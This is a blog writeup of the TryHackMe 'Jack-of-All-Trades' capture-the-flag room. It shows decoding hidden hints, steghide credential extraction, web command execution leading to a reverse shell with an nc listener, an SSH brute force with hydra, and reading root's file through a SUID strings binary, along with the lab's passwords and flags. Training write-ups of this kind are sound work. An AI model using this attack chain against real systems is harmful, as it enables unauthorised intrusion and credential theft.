---
title: TryHackMe - Jack-of-All-Trades Writeup
description: My writeup on Jack-of-All-Trades box.
categories:
 - tryhackme
tags: tryhackme
---

A really stupid box, but anyway let's pwn it.

You can find the machine there > [Jack-of-All-Trades](https://tryhackme.com/room/jackofalltrades){:target="_blank"}

As always let's start with a nmap scan.

```bash
$ ip=10.10.200.210 
$ nmap -sC -sV -oN nmap.txt $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-29 22:51 EEST
Nmap scan report for 10.10.200.210 (10.10.200.210)
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Jack-of-all-trades!
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

What a trick :P , `22=http` `80=ssh`

Let's visit the webpage. If you get an error `This address is restricted` seems like firefox blocks this port follow this guide & u will be okey [guide](https://blog.christoffer.online/2012-02-20-how-to-remove-firefoxs-this-address-is-restricted/)

If we check the page source code we can see these messages :

```
<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
			<!-- UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
```

We have a path and a base64 string, let's decode the string.

```bash
$ echo UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== | base64 --decode
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

We have a password `u?WtKSraq` cool, now let's visit the webpage `/recovery.php`

A login function, hm let's check the source code. Again a encoded string.

```
<!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->
```

Seems like base32, let's decode it.

```bash
$ echo GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ= | base32 --decode
45727a727a6f72652067756e67206775722070657271726167766e79662067622067757220657270626972656c207962747661206e657220757671717261206261206775722075627a72636e7472212056207861626a2075626a20736265747267736879206c6268206e65722c20666220757265722766206e20757661673a206f76672e796c2f3247694c443246
```

Gives us a hex string. Let's decode it.

```bash
$ echo 45727a727a6f72652067756e67206775722070657271726167766e79662067622067757220657270626972656c207962747661206e657220757671717261206261206775722075627a72636e7472212056207861626a2075626a20736265747267736879206c6268206e65722c20666220757265722766206e20757661673a206f76672e796c2f3247694c443246 | xxd -r -p
Erzrzore gung gur perqragvnyf gb gur erpbirel ybtva ner uvqqra ba gur ubzrcntr! V xabj ubj sbetrgshy lbh ner, fb urer'f n uvag: ovg.yl/2GiLD2F
```

Seems like ROT13, let's decode it.

```bash
$ echo "Erzrzore gung gur perqragvnyf gb gur erpbirel ybtva ner uvqqra ba gur ubzrcntr! V xabj ubj sbetrgshy lbh ner, fb urer'f n uvag: ovg.yl/2GiLD2F" | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'
Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S
```

Gives us a hint that we need to do stego, so i'll not waste more time i found the creds under this image `/assets/header.jpg`.

```bash
$ wget -q http://10.10.200.210:22/assets/header.jpg
$ steghide extract -sf header.jpg -p u?WtKSraq
wrote extracted data to "cms.creds".
$ cat cms.creds 
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY
```

So now we can login into `/recovery.php`

After we login in, we can see this message `GET me a 'cmd' and I'll run it for you Future-Jack.` damn easy.

```
http://10.10.200.210:22/nnxhweOV/index.php?cmd=whoami

www-data www-data
```

Let's use burp now to spawn a shell.

Send the request to repeater.

![](https://i.ibb.co/51ccwV6/1.png)

Now use this reverse shell and URL encode because the URL contains disallowed chars.

![](https://i.ibb.co/vQW7JVP/2.png)

And we have shell!

```bash
$ nc -lvp 5555
listening on [any] 5555 ...
www-data@jack-of-all-trades:/var/www/html/nnxhweOV$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@jack-of-all-trades:/var/www/html/nnxhweOV$ 
```

Now privesc to user is really simple we can see this under `/home` directory.

```bash
www-data@jack-of-all-trades:/var/www/html/nnxhweOV$ cd /home   
cd /home
www-data@jack-of-all-trades:/home$ ls -la            
ls -la
total 16
drwxr-xr-x  3 root root 4096 Feb 29 19:45 .
drwxr-xr-x 23 root root 4096 Feb 29 19:30 ..
drwxr-x---  3 jack jack 4096 May 29 20:45 jack
-rw-r--r--  1 root root  408 Feb 29 19:44 jacks_password_list
www-data@jack-of-all-trades:/home$ cat jacks_password_list
cat jacks_password_list
*hclqAzj+2GC+=0K
eN<A@n^zI?FE$I5,
X<(@zo2XrEN)#MGC
,,aE1K,nW3Os,afb
ITMJpGGIqg1jn?>@
0HguX{,fgXPE;8yF
sjRUb4*@pz<*ZITu
[8V7o^gl(Gjt5[WB
yTq0jI$d}Ka<T}PD
Sc.[[2pL<>e)vC4}
9;}#q*,A4wd{<X.T
M41nrFt#PcV=(3%p
GZx.t)H$&awU;SO<
.MVettz]a;&Z;cAC
2fh%i9Pr5YiYIf51
TDF@mdEd3ZQ(]hBO
v]XBmwAk8vk5t3EF
9iYZeZGQGG9&W4d1
8TIFce;KjrBWTAY^
SeUAwt7EB#fY&+yt
n.FZvJ.x9sYe5s5d
8lN{)g32PG,1?[pM
z@e1PmlmQ%k5sDz@
ow5APF>6r,y4krSo
```

Let's ssh brute force.

```bash
$ hydra -l jack -P wordlist.txt 10.10.200.210 ssh -s 80
[DATA] attacking ssh://10.10.200.210:80/
[80][ssh] host: 10.10.200.210   login: jack   password: ITMJpGGIqg1jn?>@
```

We're in!

```bash
$ ssh jack@10.10.200.210 -p 80
jack@10.10.200.210's password: 
jack@jack-of-all-trades:~$ ls -la
total 312
drwxr-x--- 3 jack jack   4096 May 29 20:45 .
drwxr-xr-x 3 root root   4096 Feb 29 19:45 ..
-rw-r--r-- 1 jack jack      0 May 29 20:45 @
lrwxrwxrwx 1 root root      9 Feb 29 19:34 .bash_history -> /dev/null
-rw-r--r-- 1 jack jack    220 Feb 29 19:31 .bash_logout
-rw-r--r-- 1 jack jack   3515 Feb 29 19:31 .bashrc
drwx------ 2 jack jack   4096 Feb 29 20:34 .gnupg
-rw-r--r-- 1 jack jack    675 Feb 29 19:31 .profile
-rwxr-x--- 1 jack jack 293302 Feb 28 19:38 user.jpg
jack@jack-of-all-trades:~$ 
```

For user flag, just download the image and display it, u will get this flag : `securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}`

And we can read root's flag using `strings` because it's SUID binary.

```bash
jack@jack-of-all-trades:~$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
-rwsr-xr-x 1 root root 464904 Mar 22  2015 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 294512 Feb  9  2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10248 Apr 15  2015 /usr/lib/pt_chown
-rwsr-xr-x 1 root root 44464 Nov 20  2014 /usr/bin/chsh
-rwsr-sr-x 1 daemon daemon 55424 Sep 30  2014 /usr/bin/at
-rwsr-xr-x 1 root root 53616 Nov 20  2014 /usr/bin/chfn
-rwsr-xr-x 1 root root 39912 Nov 20  2014 /usr/bin/newgrp
-rwsr-x--- 1 root dev 27536 Feb 25  2015 /usr/bin/strings
-rwsr-xr-x 1 root root 149568 Mar 12  2015 /usr/bin/sudo
-rwsr-xr-x 1 root root 54192 Nov 20  2014 /usr/bin/passwd
-rwsr-xr-x 1 root root 75376 Nov 20  2014 /usr/bin/gpasswd
-rwsr-sr-x 1 root mail 89248 Feb 11  2015 /usr/bin/procmail
-rwsr-xr-x 1 root root 3124160 Feb 17  2015 /usr/sbin/exim4
-rwsr-xr-x 1 root root 40000 Mar 29  2015 /bin/mount
-rwsr-xr-x 1 root root 27416 Mar 29  2015 /bin/umount
-rwsr-xr-x 1 root root 40168 Nov 20  2014 /bin/su
jack@jack-of-all-trades:~$ strings /root/root.txt
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
jack@jack-of-all-trades:~$ 
```

what a meme, see you!
